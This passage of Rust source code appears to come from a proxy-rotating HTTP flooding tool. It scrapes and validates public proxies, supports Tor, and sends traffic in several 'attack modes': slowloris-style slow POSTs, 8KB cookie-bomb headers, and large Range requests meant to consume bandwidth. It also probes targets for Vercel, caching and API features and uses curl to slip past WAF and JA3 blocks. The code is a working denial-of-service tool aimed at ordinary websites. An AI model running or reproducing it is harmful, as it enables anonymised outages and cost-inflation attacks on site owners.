            let _permit = match sem.acquire_owned().await { Ok(p) => p, Err(_) => return, };
            if maxed.load(Ordering::Relaxed) { return; }
            {
                let mut st = s2.lock().await;
                st.scrape_phase = (idx + 1) as u32;
                st.status_msg = format!("Scraping {} [{}/{}]...", if h {"HTML"} else {"raw"}, idx + 1, total);
            }
            let p2 = if h { scrape_html(&c2, &s_, sel.as_deref()).await } else { scrape_raw(&c2, &s_, &r2).await };
            let mut a = a2.lock().await;
            a.extend(p2);
            if a.len() >= max {
                maxed.store(true, Ordering::Relaxed);
            }
        }));
    }
    for h in handles { let _ = h.await; }
    let mut r = all.lock().await.clone(); r.sort(); r.dedup(); r.truncate(max);
    state.lock().await.total_scraped = r.len(); state.lock().await.status_msg = format!("Scraped {} unique proxies", r.len()); r
}

async fn tcp_check(addr: &str, timeout: u64) -> bool {
    use std::net::SocketAddr;
    let a = addr.trim_start_matches("http://").trim_start_matches("https://").trim_start_matches("socks4://").trim_start_matches("socks5://").trim_start_matches("socks://");
    if let Ok(socket_addr) = a.parse::<SocketAddr>() {
        tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(socket_addr)).await.ok().and_then(|r| r.ok()).is_some()
    } else {
        tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(a)).await.ok().and_then(|r| r.ok()).is_some()
    }
}

fn parse_templates(body: &str) -> String {
    let mut result = body.to_string();
    if result.contains("{{random_uuid}}") {
        let uuid = format!("{:08x}-{:04x}-4{:03x}-{:04x}-{:012x}",
            rand::random::<u32>(),
            rand::random::<u16>(),
            rand::random::<u16>() & 0x0fff,
            rand::random::<u16>() & 0x3fff | 0x8000,
            rand::random::<u64>()
        );
        result = result.replace("{{random_uuid}}", &uuid);
    }
    if result.contains("{{timestamp}}") {
        if let Ok(dur) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            result = result.replace("{{timestamp}}", &dur.as_secs().to_string());
        }
    }
    if result.contains("{{random_int}}") {
        let num = rand::random::<u32>() % 100000;
        result = result.replace("{{random_int}}", &num.to_string());
    }
    result
}

async fn fetch_page(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_page: GET {}", url);
    }
    let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    let bytes = resp.bytes().await?.len();
                    return Ok((bytes, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    last_err = Some(e);
                }
            }
        } else {
            eprintln!("[WARN] fetch_page: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_page: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_page: all attempts exhausted"),
    }
}

async fn fetch_page_with_referrer(
    c: Client,
    url: String,
    referrer: Option<String>,
    delay: u64,
    proxy_idx: usize,
    sessions: Arc<Vec<std::sync::Mutex<String>>>,
    verbose: bool,
) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_page_with_referrer: GET {} (referrer: {:?}) (proxy #{})", url, referrer, proxy_idx);
    }
    let mut builder = browser_request(c.get(&url), false);
    if let Some(ref ref_val) = referrer {
        builder = builder.header("Referer", ref_val);
    }
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    let bytes = resp.bytes().await?.len();
                    return Ok((bytes, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    last_err = Some(e);
                }
            }
        } else {
            eprintln!("[WARN] fetch_page_with_referrer: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_page_with_referrer: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_page_with_referrer: all attempts exhausted"),
    }
}

async fn fetch_range(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let end = 100 + (rand::rng().random_range(0..9000));
    if verbose {
        println!("[VERBOSE] fetch_range: GET {} range=bytes=0-{} (proxy #{})", url, end, proxy_idx);
    }
    let builder = browser_request(c.get(&url), false).header("Range", format!("bytes=0-{}", end))
        .header("Accept", "*/*").header("Cache-Control", "no-cache");
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    let bytes = resp.bytes().await?.len();
                    return Ok((bytes, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    last_err = Some(e);
                }
            }
        } else {
            eprintln!("[WARN] fetch_range: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_range: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_range: all attempts exhausted"),
    }
}

async fn fetch_slow(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_slow: GET {} (proxy #{}), streaming", url, proxy_idx);
    }
    let builder = browser_request(c.get(&url), false).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    let mut total = 0usize;
                    let mut stream = resp.bytes_stream();
                    use tokio_stream::StreamExt;
                    while let Some(chunk) = stream.next().await {
                        if let Ok(c) = &chunk { total += c.len(); }
                        tokio::time::sleep(Duration::from_millis(100)).await;
                    }
                    return Ok((total, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    last_err = Some(e);
                }
            }
        } else {
            eprintln!("[WARN] fetch_slow: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_slow: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_slow: all attempts exhausted"),
    }
}

async fn fetch_post(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_post: POST {} (proxy #{})", url, proxy_idx);
    }
    let raw_body = CUSTOM_POST_BODY.get().cloned().unwrap_or_else(|| "{\"id\":\"{{random_uuid}}\", \"timestamp\": {{timestamp}}, \"value\": {{random_int}}, \"data\":\"xxxxxxxxxx\"}".to_string());
    let body = parse_templates(&raw_body);
    let content_type = CUSTOM_CONTENT_TYPE.get().map(|s| s.as_str()).unwrap_or("application/json");
    let builder = browser_request(c.post(&url), false).header("Content-Type", content_type)
        .header("Cache-Control", "no-cache").body(body);
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    let bytes = resp.bytes().await?.len();
                    return Ok((bytes, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    last_err = Some(e);
                }
            }
        } else {
            eprintln!("[WARN] fetch_post: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_post: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_post: all attempts exhausted"),
    }
}

async fn fetch_cookie(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_cookie: GET {} with cookie bomb (8KB payload) (proxy #{})", url, proxy_idx);
    }
    let bomb_payload = "x".repeat(8192);
    let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
        rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
    let builder = browser_request(c.get(&url), false).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let builder = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie);
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    let bytes = resp.bytes().await?.len();
                    return Ok((bytes, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    last_err = Some(e);
                }
            }
        } else {
            eprintln!("[WARN] fetch_cookie: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_cookie: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_cookie: all attempts exhausted"),
    }
}

async fn fetch_slowloris(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_slowloris: POST {} slowloris attack (proxy #{})", url, proxy_idx);
    }
    use tokio_stream::StreamExt;
    let stream = tokio_stream::wrappers::IntervalStream::new(tokio::time::interval(Duration::from_secs(3)))
        .take(10)
        .map(|_| Ok::<_, std::io::Error>(bytes::Bytes::from("a")));
    let body = reqwest::Body::wrap_stream(stream);
    let builder = browser_request(c.post(&url), false)
        .header("Content-Type", "application/octet-stream")
        .header("Content-Length", "10")
        .header("Cache-Control", "no-cache")
        .body(body);
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    let bytes = resp.bytes().await?.len();
                    return Ok((bytes, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    last_err = Some(e);
                }
            }
        } else {
            eprintln!("[WARN] fetch_slowloris: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_slowloris: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_slowloris: all attempts exhausted"),
    }
}

/// Bandwidth mode: request a large range from the server to actually
/// consume downstream bandwidth. Uses a `Range: bytes=0-99999999` header
/// to ask for a large chunk; many servers return 206 Partial Content.
async fn fetch_bandwidth(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    if verbose {
        println!("[VERBOSE] fetch_bandwidth: GET {} with Range header (proxy #{})", url, proxy_idx);
    }
    let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
    let builder = builder.header(reqwest::header::RANGE, "bytes=0-99999999");
    let mut last_err = None;
    for attempt in 0..=2 {
        if let Some(cloned) = builder.try_clone() {
            match cloned.send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
                    // Read the full body to actually consume bandwidth
                    let bytes = resp.bytes().await?.len();
                    if verbose {
                        println!("  [BANDWIDTH] Got {} bytes (HTTP {})", bytes, status);
                    }
                    return Ok((bytes, status));
                }
                Err(e) => {
                    if attempt < 2 {
                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                    }
                    if attempt == 2 {
                        last_err = Some(e);
                    }
                }
            }
        } else {
            eprintln!("[WARN] fetch_bandwidth: builder.try_clone() returned None (attempt {})", attempt);
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
                continue;
            } else {
                return Err(FetchError::from(std::io::Error::other(
                    "fetch_bandwidth: builder.try_clone() returned None on final retry",
                )));
            }
        }
    }
    match last_err {
        Some(e) => Err(FetchError::from(e)),
        None => unreachable!("fetch_bandwidth: all attempts exhausted"),
    }
}

struct LatencySamples {
    samples: Vec<AtomicU32>,
    idx: AtomicUsize,
}

impl LatencySamples {
    fn new(size: usize) -> Self {
        let mut samples = Vec::with_capacity(size);
        for _ in 0..size {
            samples.push(AtomicU32::new(0));
        }
        LatencySamples {
            samples,
            idx: AtomicUsize::new(0),
        }
    }
    fn record(&self, val: u32) {
        if self.samples.is_empty() { return; }
        let pos = self.idx.fetch_add(1, Ordering::Relaxed) % self.samples.len();
        self.samples[pos].store(val, Ordering::Relaxed);
    }
    fn get_percentiles(&self) -> (u32, u32, u32, u32) {
        let mut res = Vec::new();
        for s in &self.samples {
            let v = s.load(Ordering::Relaxed);
            if v > 0 {
                res.push(v);
            }
        }
        if res.is_empty() {
            return (0, 0, 0, 0);
        }
        res.sort_unstable();
        let len = res.len();
        let p50 = res[len * 50 / 100];
        let p90 = res[len * 90 / 100];
        let p95 = res[len * 95 / 100];
        let p99 = res[len * 99 / 100];
        (p50, p90, p95, p99)
    }
}

#[derive(Clone)]
struct Stats {
    running: Arc<AtomicBool>,
    total_requests: Arc<AtomicU64>,
    total_bytes: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
    error_timeout: Arc<AtomicU64>,
    error_connect: Arc<AtomicU64>,
    error_other: Arc<AtomicU64>,
    total_latency_ms: Arc<AtomicU64>,
    status_2xx: Arc<AtomicU64>,
    status_3xx: Arc<AtomicU64>,
    status_4xx: Arc<AtomicU64>,
    status_5xx: Arc<AtomicU64>,
    status_other: Arc<AtomicU64>,
    latency_samples: Arc<LatencySamples>,
    concurrency: Arc<AtomicUsize>,
}

impl Stats {
    fn new() -> Self {
        Stats {
            running: Arc::new(AtomicBool::new(false)),
            total_requests: Arc::new(AtomicU64::new(0)),
            total_bytes: Arc::new(AtomicU64::new(0)),
            errors: Arc::new(AtomicU64::new(0)),
            error_timeout: Arc::new(AtomicU64::new(0)),
            error_connect: Arc::new(AtomicU64::new(0)),
            error_other: Arc::new(AtomicU64::new(0)),
            total_latency_ms: Arc::new(AtomicU64::new(0)),
            status_2xx: Arc::new(AtomicU64::new(0)),
            status_3xx: Arc::new(AtomicU64::new(0)),
            status_4xx: Arc::new(AtomicU64::new(0)),
            status_5xx: Arc::new(AtomicU64::new(0)),
            status_other: Arc::new(AtomicU64::new(0)),
            latency_samples: Arc::new(LatencySamples::new(16384)),
            concurrency: Arc::new(AtomicUsize::new(20)),
        }
    }
}

#[allow(dead_code)]
struct AppState {
    mode: ProxyMode, stats: Stats, iteration: u64,
    status_msg: String, proxy_status: Vec<(String, String)>,
    total_alive: usize, total_working: usize, total_scraped: usize,
    scrape_phase: u32, scrape_total: u32, tcp_checked: u32, tcp_total: u32,
    validated: u32, validation_total: u32, target_url: String,
    attack_mode: AttackMode, max_scrape: usize, load_concurrency: usize,
    interval_ms: u64, jitter_ms: u64, tcp_concurrency: usize,
    rate_limit: Option<u64>,
    validate_concurrency: usize, validate_timeout_secs: u64,
    probe_status: String, has_image_opt: bool, has_api: bool, has_middleware: bool,
    is_vercel: bool, vercel_plan: String,
    has_isr: bool, has_cache_bypass: bool, has_edge_config: bool, has_log_drains: bool, has_storage: bool,
    imgs: Vec<String>, apis: Vec<String>, statics: Vec<String>,
    sessions: Arc<Vec<std::sync::Mutex<String>>>,
    client_config: ClientConfig,
    custom_selector: Option<String>,
    tor_proxy: Option<String>,
    verbose: bool,
}

impl AppState {
    fn new() -> Self { AppState {
        mode: ProxyMode::Scrape, stats: Stats::new(), iteration: 0,
        status_msg: "Ready".to_string(), proxy_status: vec![],
        total_alive: 0, total_working: 0, total_scraped: 0,
        scrape_phase: 0, scrape_total: 0, tcp_checked: 0, tcp_total: 0,
        validated: 0, validation_total: 0, target_url: DEFAULT_TARGET_URL.to_string(),
        attack_mode: AttackMode::Normal, max_scrape: 100_000, load_concurrency: 20,
        interval_ms: 10, jitter_ms: 50, tcp_concurrency: 500,
        rate_limit: None,
        validate_concurrency: 500, validate_timeout_secs: 1,
        probe_status: "Not probed".to_string(), has_image_opt: false, has_api: false,
        has_middleware: false, is_vercel: false, vercel_plan: String::new(),
        has_isr: false, has_cache_bypass: false, has_edge_config: false, has_log_drains: false, has_storage: false,
        imgs: vec![], apis: vec![], statics: vec![],
        sessions: Arc::new(Vec::new()),
        client_config: ClientConfig::default(),
        custom_selector: None,
        tor_proxy: None,
        verbose: false,
    }}
}

fn url_join(base: &str, href: &str) -> String {
    let href = href.trim();
    if href.is_empty() || href.starts_with("data:") || href.starts_with("blob:") || href.starts_with("javascript:") || href.starts_with("#") { return String::new(); }
    if href.starts_with("http://") || href.starts_with("https://") { return href.to_string(); }
    if href.starts_with("//") { return format!("https:{}", href); }
    let base = base.trim_end_matches('/');
    if href.starts_with('/') { format!("{}{}", base, href.trim_start_matches('/')) } else { format!("{}{}", base, href) }
}

#[allow(clippy::expect_used)]
#[allow(clippy::unwrap_used)]
async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
    let (config, tor_proxy_opt, mode) = {
        let st = state.lock().await;
        (st.client_config.clone(), st.tor_proxy.clone(), st.mode)
    };
    let effective_tor_proxy = if let Some(ref p) = tor_proxy_opt {
        Some(p.clone())
    } else if mode == ProxyMode::Tor || mode == ProxyMode::ScrapeTorFallback {
        Some("socks5h://127.0.0.1:9050".to_string())
    } else {
        None
    };

    let mut builder = browser_client_builder(&config).redirect(reqwest::redirect::Policy::limited(config.max_redirects))
        .timeout(Duration::from_secs(5))
        .danger_accept_invalid_certs(true);
    if let Some(ref p) = effective_tor_proxy {
        if let Ok(proxy_val) = reqwest::Proxy::all(p) {
            builder = builder.proxy(proxy_val);
        }
    }
    let c = builder.build().unwrap_or_else(|e| {
        eprintln!("  Failed to build HTTP client: {}", e);
        std::process::exit(1);
    });

    let base = target_url.trim_end_matches('/');
    let mut vercel = false; let mut plan = String::new(); let mut middleware = false;
    let mut imgs: Vec<String> = vec![]; let mut apis: Vec<String> = vec![]; let mut statics: Vec<String> = vec![]; let mut imgopt = false;
    let mut isr = false; let mut cache_bypass = false; let mut edge_config = false; let mut html = String::new();

    // Fetch headers using curl to bypass JA3/WAF blocks
    let mut curl_args = vec!["-I", "-s", "-m", "5", "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
    let mut curl_proxy_arg = String::new();
    if let Some(ref proxy) = effective_tor_proxy {
        curl_proxy_arg = format!("socks5h://{}", proxy.trim_start_matches("socks5://").trim_start_matches("socks5h://"));
        curl_args.push("--proxy");
        curl_args.push(&curl_proxy_arg);
    }
    curl_args.push(base);

    let cmd = tokio::process::Command::new("curl")
        .args(&curl_args)
        .output()
        .await;

    if let Ok(out) = cmd {
        let stdout_str = String::from_utf8_lossy(&out.stdout).to_string();
        for line in stdout_str.lines() {
            let line_lower = line.to_lowercase();
            if let Some(rest) = line_lower.strip_prefix("server:") {
                let val = rest.trim();
                if val.to_lowercase().contains("vercel") {
                    vercel = true;
                }
                if val.to_lowercase().contains("cloudflare") {
                    plan = "Cloudflare".to_string();
                }
            } else if let Some(rest) = line_lower.strip_prefix("x-vercel-id:") {
                let val = rest.trim();
                plan = format!("Vercel ({})", val.split("::").next().unwrap_or(""));
                vercel = true;
            } else if line_lower.starts_with("x-middleware-") || line_lower.starts_with("x-middleware-next:") || line_lower.starts_with("x-middleware-request:") {
                middleware = true;
            } else if line_lower.starts_with("x-vercel-edge-config-") || line_lower.starts_with("x-edge-config-") {
                edge_config = true;
            } else if let Some(rest) = line_lower.strip_prefix("x-vercel-cache:") {
                let val = rest.trim();
                if val == "REVALIDATED" {
                    isr = true;
                }
                if val == "MISS" || val == "STALE" {
                    cache_bypass = true;
                }
            } else if line_lower.starts_with("x-nextjs-cache:") {
                isr = true;
            }
        }
    }

    // Fetch HTML body using curl (bypass WAF/JA3)
    let mut curl_html_args = vec![
        "-s", "-m", "8", "-L",
        "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: en-US,en;q=0.9",
        "-H", "Accept-Encoding: gzip, deflate, br",
        "--compressed",
    ];
    if effective_tor_proxy.is_some() {
        curl_html_args.push("--proxy");
        curl_html_args.push(&curl_proxy_arg);
    }
    curl_html_args.push(base);

    let html_cmd = tokio::process::Command::new("curl")
        .args(&curl_html_args)
        .output()
        .await;
    if let Ok(out) = html_cmd {
        if out.status.success() {
            html = String::from_utf8_lossy(&out.stdout).to_string();
        }
    }

    if !html.is_empty() {
        let doc = Html::parse_document(&html);
        for sel in & [("link[href]", "href"), ("script[src]", "src"), ("img[src]", "src")] {
            let s = Selector::parse(sel.0).unwrap_or_else(|e| {
                eprintln!("  Failed to parse selector '{}': {}", sel.0, e);
                std::process::exit(1);
            });
            for el in doc.select(&s) { if let Some(v) = el.value().attr(sel.1) { let j = url_join(base, v); if !j.is_empty() { statics.push(j); } } }
        }
        let src_sel = Selector::parse("source[srcset]").unwrap_or_else(|e| {
            eprintln!("  Failed to parse selector 'source[srcset]': {}", e);
            std::process::exit(1);
        });
        for el in doc.select(&src_sel) {
            if let Some(srcset) = el.value().attr("srcset") {
                let first = srcset.split(',').next().unwrap_or("").split_whitespace().next().unwrap_or("");
                let j = url_join(base, first); if !j.is_empty() { statics.push(j); }
            }
        }
    }
    for path in & ["/favicon.ico", "/favicon.svg", "/favicon.png"] { let f = format!("{}{}", base, path); if !statics.contains(&f) { statics.push(f); } }
    statics.sort(); statics.dedup();

    // Concurrently verify statics
    let mut verified_statics: Vec<String> = vec![];
    let sem = Arc::new(Semaphore::new(10));
    let mut join_handles = vec![];
    for path in statics {
        let sem_clone = sem.clone();
        let c_clone = c.clone();
        let path_clone = path.clone();
        let vercel_clone = vercel;
        join_handles.push(tokio::spawn(async move {
            let _permit = match sem_clone.acquire().await { Ok(p) => p, Err(_) => return (path_clone.clone(), false, false, false) };
            let mut is_img = false;
            let mut is_img_opt = false;
            let mut is_ok = false;
            if let Ok(r) = browser_request(c_clone.get(&path_clone), false).send().await {
                if r.status().as_u16() < 400 {
                    let sz = r.bytes().await.map(|b| b.len()).unwrap_or(0);
                    if sz > 0 {
                        is_ok = true;
                        let lower = path_clone.to_lowercase();
                        if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
                            is_img = true;
                            if vercel_clone {
                                if let Ok(r2) = browser_request(c_clone.get(format!("{}?width=300", path_clone)), false).send().await {
                                    let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
                                    if sz2 > 0 && sz2 != sz {
                                        is_img_opt = true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            (path_clone, is_ok, is_img, is_img_opt)
        }));
    }
    for h in join_handles {
        if let Ok((path, is_ok, is_img, is_img_opt)) = h.await {
            if is_ok {
                verified_statics.push(path.clone());
                if is_img {
                    imgs.push(path);
                    if is_img_opt {
                        imgopt = true;
                    }
                }
            }
        }
    }

    // Concurrently verify APIs
    let api_paths = ["/api/chat", "/api/health", "/api/status", "/api/products", "/api/generate"];
    let mut api_handles = vec![];
    for path in api_paths {
        let c_clone = c.clone();
        let url = format!("{}{}", base, path);
        api_handles.push(tokio::spawn(async move {
            if let Ok(r) = browser_request(c_clone.get(&url), false).send().await {
                if r.status().as_u16() < 400 {
                    return Some(path.to_string());
                }
            }
            None
        }));
    }
    for h in api_handles {
        if let Ok(Some(path)) = h.await {
            apis.push(path);
        }
    }
    
    let mut status = String::new();
    // Platform prefix
    if !plan.is_empty() { status.push_str(&format!("{} | ", plan)); } else if vercel { status.push_str("Vercel | "); } else { status.push_str("Unknown | "); }
    // Feature flags
    if !verified_statics.is_empty() { status.push_str(&format!("{} assets ✅ ", verified_statics.len())); }
    if imgopt { status.push_str("ImgOpt ✅ "); }
    if !apis.is_empty() { status.push_str(&format!("{} APIs ✅ ", apis.len())); }
    if middleware { status.push_str("MW ✅ "); }
    if isr { status.push_str("ISR ✅ "); }
    if cache_bypass { status.push_str("CacheBypass ✅ "); }
    if edge_config { status.push_str("EdgeCfg ✅ "); }
    if vercel { status.push_str("LogDrain 🔸 "); }
    // Only mark unreachable if we couldn't even detect the platform
    let platform_known = vercel || !plan.is_empty();
    if !platform_known && verified_statics.is_empty() && !imgopt && apis.is_empty() && !middleware { 
        status.push_str("Empty/unreachable"); 
    } else if !verified_statics.is_empty() || !apis.is_empty() || imgopt {
        // Already has detailed info, no extra label needed
    } else if platform_known {
        // Platform confirmed but statics blocked by WAF — still reachable
        status.push_str("Reachable ✅");
    }

    let mut st = state.lock().await;
    st.probe_status = status; st.is_vercel = vercel; st.vercel_plan = plan; st.has_image_opt = imgopt; st.has_api = !apis.is_empty(); st.has_middleware = middleware;
    st.has_isr = isr; st.has_cache_bypass = cache_bypass; st.has_edge_config = edge_config; st.has_log_drains = vercel; st.has_storage = false;
    st.imgs = imgs; st.apis = apis; st.statics = verified_statics;
}

#[allow(clippy::expect_used)]
async fn http_proxy_check(proxy_url: &str, target_url: &str, _config: &ClientConfig) -> bool {
    let proxy = match reqwest::Proxy::all(proxy_url) {
        Ok(p) => p,
        Err(_) => return false,
    };
    let client = match reqwest::Client::builder()
        .proxy(proxy)
        .timeout(Duration::from_secs(4))
        .danger_accept_invalid_certs(true)
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };
    client.get(target_url)
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .send()
        .await
        .is_ok()
}

async fn filter_alive_proxies(proxies: &[String], target_url: &str, config: &ClientConfig, state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let to = 3u64;
    let tc = 1000usize;
    let total = proxies.len();
    state.lock().await.tcp_total = total as u32;
    state.lock().await.status_msg = format!("TCP checking {}...", total);
    let sem = Arc::new(Semaphore::new(tc));
    let d = Arc::new(AtomicUsize::new(0));
    let s2 = Arc::clone(state);
    let mut h = Vec::with_capacity(total);
    
    let target = target_url.to_string();
    let client_cfg = config.clone();

    for p in proxies.iter().cloned() {
        let sem = sem.clone();
        let dd = d.clone();
        let ss = s2.clone();
        let target_clone = target.clone();
        let cfg_clone = client_cfg.clone();
        h.push(tokio::spawn(async move {
            let _permit = match sem.acquire_owned().await { Ok(p) => p, Err(_) => return None, };
            let mut alive = tcp_check(&p, to).await;
            if alive {
                // If TCP port is open, verify proxy routing ability via HTTP request to target URL
                alive = http_proxy_check(&p, &target_clone, &cfg_clone).await;
            }
            let n = dd.fetch_add(1, Ordering::Relaxed) + 1;
            if n.is_multiple_of(500) || n == total {
